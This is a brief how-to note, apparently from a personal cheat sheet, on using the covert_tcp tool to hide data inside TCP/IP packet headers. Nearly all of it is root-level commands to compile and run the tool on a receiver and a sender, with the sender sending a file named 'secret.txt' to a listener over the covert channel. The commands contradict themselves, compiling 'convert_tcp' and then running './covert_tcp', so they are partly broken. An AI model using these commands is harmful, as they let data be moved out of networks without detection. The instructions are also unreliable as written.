
For hiding data manipulating TCP/IP packet headers

Download
Google > covert_tcp.c download

Commands Receiver Machine
sudo su
cc -o convert_tcp convert_tcp.c
./covert_tcp -source "Sender Machine IP Address" -source_port "9999" -server -file "file name (receive.txt)"

Commands Sender Machine
sudo su
cc -o convert_tcp convert_tcp.c
./covert_tcp -source "Local IP Address" -dest "Listener Machine IP" -source_port "9999" -dest_port "8888" -file "file name (secret.txt)"

